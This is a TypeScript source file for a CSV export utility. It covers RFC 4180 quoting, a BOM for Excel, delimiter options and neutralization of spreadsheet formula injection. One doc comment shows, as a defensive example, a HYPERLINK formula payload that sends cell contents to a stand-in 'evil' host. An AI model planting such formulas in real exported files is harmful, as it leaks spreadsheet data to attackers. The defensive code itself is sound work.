/**
 * @tempest-limits param-count — `downloadCsv(rows, columns, "usuarios.csv")` reads
 * in the order the sentence does, and its two trailing parameters have defaults,
 * so the common call passes three. Wrapping them in an object would break every
 * caller of a published export for no gain in what the call site says.
 */
// CSV that survives contact with real data. Every app writes this by hand and
// every hand-written version gets the same two things wrong: a value containing
// the delimiter splits the row, and a value containing a quote breaks the quoting
// it was supposed to be protected by. Both are one-liners in RFC 4180 and neither
// is obvious until a customer's name has a comma in it.

import { shareOrDownloadBlob } from "../share/share-or-download";

/**
 * Byte order mark, as the character `String.prototype` sees it.
 *
 * Excel on a pt-BR install reads a BOM-less UTF-8 file as Latin-1 and turns
 * every accented name into mojibake. It is three bytes to avoid a support
 * ticket, so it is on by default.
 */
const BOM = "\uFEFF";

/** One column of the exported file. */
export interface CsvColumn<T> {
    /** Property of the row this column reads from. Doubles as the column key. */
    key: keyof T;
    /** Column heading, written to the first line. */
    header: string;
    /**
     * Value for the file. Defaults to `String(row[key])`, with nullish becoming an
     * empty field.
     *
     * A `DataTableColumn` renders cells to `ReactNode`, which cannot be written to
     * a text file — a badge or a link would serialize as `[object Object]`. Give
     * the column this accessor and the export says what the badge said.
     */
    csv?: (row: T) => string | number | boolean | null | undefined;
}

/** Options for {@link toCsv}. */
export interface CsvOptions {
    /**
     * Field separator. Default `","`.
     *
     * Use `";"` for Excel on a locale whose decimal separator is the comma —
     * which is every pt-BR install — otherwise it opens the file in one column.
     */
    delimiter?: "," | ";";
    /** Prefix the output with a UTF-8 BOM. Default `true`. */
    bom?: boolean;
    /**
     * Prefix `'` to every text field that a spreadsheet would read as a formula.
     * Default `true`.
     *
     * A field starting with `=`, `+`, `-`, `@`, TAB or CR is a formula start by the
     * OWASP list (Excel and Google Sheets read it so; LibreOffice 26.2 evaluated only
     * `=`), and opening the file evaluates it: a name typed
     * as `=HYPERLINK("https://evil/?d="&A1,"ver")` turns into a link that exfiltrates
     * other cells (OWASP "CSV Injection"). Measured on LibreOffice 26.2: `=1+2` was
     * imported as the formula `of:=1+2` with value `3`. The default is the safe one
     * because the BOM and the `;` delimiter already aim the file at a spreadsheet,
     * and because the app that exports rarely controls every value in it.
     *
     * Numbers are never prefixed: a `number` cell, or a text field that is only a
     * number (`"-5"`, `"-1.234,56"`, `"+42"`, `"1e-7"`), cannot be a formula, and
     * neither can a lone `"-"`, which is left alone too. Pass
     * `false` when the file feeds another system's importer rather than a person's
     * spreadsheet, so the bytes round-trip unchanged.
     */
    neutralizeFormulas?: boolean;
}

/** First characters that make a spreadsheet read a field as a formula (OWASP). */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

/**
 * A text field that is only a number, in either decimal convention.
 *
 * These start with `-` or `+` but cannot be formulas, and prefixing them would
 * turn every negative amount in a report into text.
 */
const PLAIN_NUMBER = /^[+-]?(?:\d+(?:[.,]\d+)*|\d*[.,]\d+)(?:e[+-]?\d+)?$/i;

/**
 * Neutralize a text field a spreadsheet would evaluate.
 *
 * Two shapes are exempt from the OWASP trigger list: a plain number (see
 * {@link PLAIN_NUMBER}) and a lone `-`, the usual "no value" placeholder in a
 * report. A lone operator has no operand, so no spreadsheet can evaluate it, and
 * prefixing it printed `'-` in LibreOffice 26.2 where `-` read as text.
 *
 * Measured on LibreOffice 26.2 headless (`--infilter="CSV:59,34,76,1"`) without
 * the prefix: `=1+2` was a formula; `+55 (11) 99999-9999`, `@maria`, a TAB before
 * `=`, a space before `=` and a quoted newline before `=` all stayed text. The
 * list is kept whole anyway — Excel and Google Sheets read `+`, `-`, `@` and TAB
 * as formula starts, and that is what OWASP's list is for. A space or newline
 * before `=` is not added: it read as text, not as a formula.
 *
 * @param value - The already-stringified field.
 * @returns The field with a leading `'` when it would read as a formula.
 */
function neutralizeFormula(value: string): string {
    if (value === "-" || PLAIN_NUMBER.test(value)) return value;
    return FORMULA_TRIGGER.test(value) ? `'${value}` : value;
}

/**
 * Quote one field per RFC 4180.
 *
 * A field is quoted when it contains the delimiter, a double quote, or a line
 * break; inside a quoted field, each double quote is doubled. Fields that need
 * none of this are written bare, which keeps the common file readable.
 *
 * @param value - The already-stringified field.
 * @param delimiter - The separator in use, which decides part of the quoting.
 * @returns The field, quoted if it has to be.
 */
function escapeField(value: string, delimiter: string): string {
    const mustQuote =
        value.includes(delimiter) ||
        value.includes('"') ||
        value.includes("\n") ||
        value.includes("\r");
    if (!mustQuote) return value;
    return `"${value.replaceAll('"', '""')}"`;
}

/**
 * Stringify one cell, keeping the difference between "no value" and "zero".
 *
 * `null` and `undefined` become an empty field; `0` and `false` are values
 * somebody chose and are written out. Getting this backwards is how an export
 * ends up under-reporting every row that legitimately holds a zero.
 *
 * Text — a string, or anything else stringified — goes through the formula
 * neutralization when it is on; numbers, bigints and booleans never do, since none
 * of them can stringify to a formula.
 *
 * @param value - The raw cell value.
 * @param neutralize - Whether to neutralize a formula-looking text field.
 * @returns The text to write.
 */
function cellText(value: unknown, neutralize: boolean): string {
    if (value === null || value === undefined) return "";
    if (typeof value === "number" || typeof value === "bigint" || typeof value === "boolean") {
        return String(value);
    }
    if (value instanceof Date) return value.toISOString();
    return neutralize ? neutralizeFormula(String(value)) : String(value);
}

/**
 * Serialize rows to CSV text, RFC 4180 style.
 *
 * Rows are separated by `\r\n` — the RFC's terminator and the one Excel is least
 * surprised by. Text that a spreadsheet would evaluate as a formula is written
 * with a leading `'` unless `neutralizeFormulas` is `false` (see
 * {@link CsvOptions.neutralizeFormulas}). A row is emitted for the header even when `rows` is empty, so the
 * person who opens the file sees which columns they asked for instead of a blank
 * document.
 *
 * @example
 * const csv = toCsv(users, [
 *     { key: "name", header: "Nome" },
 *     { key: "email", header: "E-mail" },
 *     { key: "plan", header: "Plano", csv: (user) => user.plan.label },
 * ]);
 *
 * @param rows - The rows to export.
 * @param columns - Columns, in the order they should appear.
 * @param options - Delimiter, BOM and formula neutralization.
 * @returns The complete file contents.
 */
export function toCsv<T>(
    rows: readonly T[],
    columns: readonly CsvColumn<T>[],
    options: CsvOptions = {},
): string {
    const { delimiter = ",", bom = true, neutralizeFormulas = true } = options;

    const lines = [
        columns
            .map((column) => escapeField(cellText(column.header, neutralizeFormulas), delimiter))
            .join(delimiter),
    ];

    for (const row of rows) {
        const cells = columns.map((column) => {
            const raw = column.csv
                ? column.csv(row)
                : (row as Record<string, unknown>)[column.key as string];
            return escapeField(cellText(raw, neutralizeFormulas), delimiter);
        });
        lines.push(cells.join(delimiter));
    }

    return `${bom ? BOM : ""}${lines.join("\r\n")}`;
}

/**
 * Build a CSV and hand it to the user.
 *
 * Goes through {@link shareOrDownloadBlob}, so on a phone it opens the native
 * share sheet and everywhere else it downloads — the same path every other
 * generated artifact in the SDK takes, instead of a fourth hand-rolled `<a
 * download>`.
 *
 * @example
 * await downloadCsv(users, COLUMNS, "usuarios.csv");
 *
 * @param rows - The rows to export.
 * @param columns - Columns, in the order they should appear.
 * @param fileName - File name offered to the user. Default `"export.csv"`.
 * @param options - Delimiter, BOM and formula neutralization, forwarded to
 *   {@link toCsv}.
 * @returns A promise that resolves once the share or download completes.
 */
export async function downloadCsv<T>(
    rows: readonly T[],
    columns: readonly CsvColumn<T>[],
    fileName = "export.csv",
    options: CsvOptions = {},
): Promise<void> {
    const blob = new Blob([toCsv(rows, columns, options)], {
        type: "text/csv;charset=utf-8",
    });
    await shareOrDownloadBlob(blob, fileName);
}
